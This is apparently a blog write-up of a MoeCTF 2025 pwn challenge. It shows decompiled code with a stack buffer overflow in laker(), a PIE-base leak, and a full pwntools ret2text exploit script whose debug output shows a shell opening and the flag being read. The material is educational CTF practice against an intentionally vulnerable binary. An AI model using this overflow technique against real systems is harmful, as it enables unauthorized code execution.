---
title: 'XiDianCTF MoeCTF 2025 PWN Xdulaker'
date: '2026-09-06T09:32:57+08:00'
lastmod: '2026-09-06T09:32:57+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "Pwn"
---

```
本文为人工撰写，仅使用生成式AI校对。
```

[题目链接](https://ctf.xidian.edu.cn/training/22?challenge=892)

IDA，然后是IDA。

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  menu();
    
  while ( 1 ){
    while ( 1 ){
        putchar(62);
        __isoc99_scanf("%d", &opt);
        if ( opt != 1 )
            break;
          pull();
   }
      
      
   if ( opt == 2 ){
      photo();
    }else{
      if ( opt != 3 )
        exit(0);
      laker();
    }
  }
}
```

```c
int pull()
{
  return printf("Thanks,I'll give you a gift:%p\n", &opt);
}
```

```c
int photo()
{
  char buf[80]; // [rsp+0h] [rbp-50h] BYREF

  puts("Hey,what's your name?!");
  read(0, buf, 0x40uLL);
  return puts("I will teach you a lesson.");
}
```

```c
ssize_t laker()
{
  char s1[48]; // [rsp+0h] [rbp-30h] BYREF

  if ( memcmp(s1, "xdulaker", 8uLL) )
  {
    puts("You are not him.");
    exit(0);
  }
  puts("welcome,xdulaker");
  return read(0, s1, 0x100uLL);
}
```

> 注意到`laker()`检查了`s1`的值，所以我们需要在`photo()`中构建其要求的值。
>
> > 函数退出时只会调整`rsp`来释放栈，进入时也不会自动清空新扩展的栈区。

```c
int backdoor()
{
  return system("/bin/sh");
}
```

> 看起来这就是目标地址。



注意到:

| RELRO        | Full RELRO      |
| ------------ | --------------- |
| STACK CANARY | No canary found |
| NX           | NX enabled      |
| PIE          | PIE enabled     |
| RPATH        | No RPATH        |
| RUNPATH      | No RUNPATH      |
| Symbols      | 54 Symbols      |
| FORTIFY      | No              |
| Fortified    | 0               |
| Fortifiable  | 2               |
| FILE         | pwn             |

我们需要算基址和偏移，使用`pull()`中给定的全局变量地址计算即可。



所以构造`ret2text`:

```python
from pwn import *
import ctypes
context(arch='amd64', os='linux', log_level='debug')

io = connect("127.0.0.1", 40229)



io.recvuntil(b'>')
io.sendline(str("1").encode())

io.recvuntil(b'gift:')
add = int(io.recv(16), 16)
print(add)
print(hex(add))

io.recvuntil(b'>')
io.sendline(str("2").encode())

io.recvuntil(b'name?!')
io.sendline(b'xdulaker' * 5)


io.recvuntil(b'>')
io.sendline(str("3").encode())

baseAdd = add - 0x4010
off = 0x1251

io.recvuntil(b'xdulaker')
io.sendline(b'A' * 48 + b'A' * 8 + p64(baseAdd + off))

io.interactive()
```



输出:

```
[x] Opening connection to 127.0.0.1 on port 40229
[x] Opening connection to 127.0.0.1 on port 40229: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 40229: Done
[DEBUG] Received 0x6d bytes:
    b'A freshman has walked into the lake.\n'
    b'1.Pull him out\n'
    b'2.Take a photo of him\n'
    b'3.Walk into the lake.\n'
    b'Your choice\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x2b bytes:
    b"Thanks,I'll give you a gift:0x55a4a6405010\n"
94165652230160
0x55a4a6405010
[DEBUG] Received 0x1 bytes:
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x16 bytes:
    b"Hey,what's your name?!"
[DEBUG] Sent 0x29 bytes:
    b'xdulakerxdulakerxdulakerxdulakerxdulaker\n'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x1c bytes:
    b'I will teach you a lesson.\n'
    b'>'
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[DEBUG] Received 0x10 bytes:
    b'welcome,xdulaker'
[DEBUG] Sent 0x41 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000030  41 41 41 41  41 41 41 41  51 22 40 a6  a4 55 00 00  │AAAA│AAAA│Q"@·│·U··│
    00000040  0a                                                  │·│
    00000041
[*] Switching to interactive mode
[DEBUG] Received 0x1 bytes:
    b'\n'

$ ls
[DEBUG] Sent ...
[DEBUG] Received ...
bin
flag
lib
lib32
lib64
libexec
libx32
pwn
& cat flag
[DEBUG] Sent ...
[DEBUG] Received ...
moectf{THIS_IS_FLAG}
```

